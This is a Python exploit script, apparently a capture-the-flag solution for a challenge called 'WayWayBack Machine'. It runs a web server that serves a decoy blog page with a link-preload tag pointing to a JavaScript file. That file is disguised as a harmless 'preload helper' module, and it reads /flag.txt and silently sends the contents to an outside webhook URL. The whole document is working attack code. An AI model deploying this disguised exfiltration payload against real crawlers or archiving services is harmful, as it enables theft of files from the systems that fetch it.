#!/usr/bin/env python3
"""
WayWayBack Machine - Link Preload Injection Exploit
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import socket

PAYLOAD_PORT = 8080  # Changed from 80 to match Docker mapping
WEBHOOK_URL = "https://webhook.site/effa9aa3-75c4-4ddd-9f21-4905c64ab0b0"

class ExploitServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            print(f"Bot requesting main page")
            server_address = "73.83.40.133"
            
            html = f'''<!DOCTYPE html>
<html>
<head>
    <title>My Blog Post</title>
    <!-- This link will be extracted and downloaded -->
    <link rel="preload" href="/preload-helper.js" as="script">
</head>
<body>
    <h1>Welcome to my blog!</h1>
</body>
</html>'''
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        elif self.path == '/preload-helper.js':
            print(f"Bot downloading preload-helper.js")
            
            # Malicious JS that reads and exfiltrates flag
            malicious_js = f'''// Preload optimization helper
const fs = require('fs');
const https = require('https');

try {{
  // Read the flag
  const flag = fs.readFileSync('/flag.txt', 'utf8').trim();
  
  // Exfiltrate to webhook
  const url = new URL('{WEBHOOK_URL}');
  url.searchParams.set('flag', flag);
  
  https.get(url.toString(), (res) => {{
    console.log('Resource preloaded successfully');
  }}).on('error', () => {{}});
  
}} catch (err) {{
  // Silent fail
}}

// Export to look like a legitimate module
module.exports = {{ preload: () => {{}} }};
'''
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.end_headers()
            self.wfile.write(malicious_js.encode())
            
            print(f"Malicious preload-helper.js served!")
            print(f"When snapshot is viewed, flag will be exfiltrated")
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def main():    
    exploit_server = HTTPServer(('0.0.0.0', PAYLOAD_PORT), ExploitServer)
    exploit_thread = threading.Thread(target=exploit_server.serve_forever, daemon=True)
    exploit_thread.start()
    
    print(f"Exploit server running on 0.0.0.0:{PAYLOAD_PORT}")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        exploit_server.shutdown()

if __name__ == '__main__':
    main()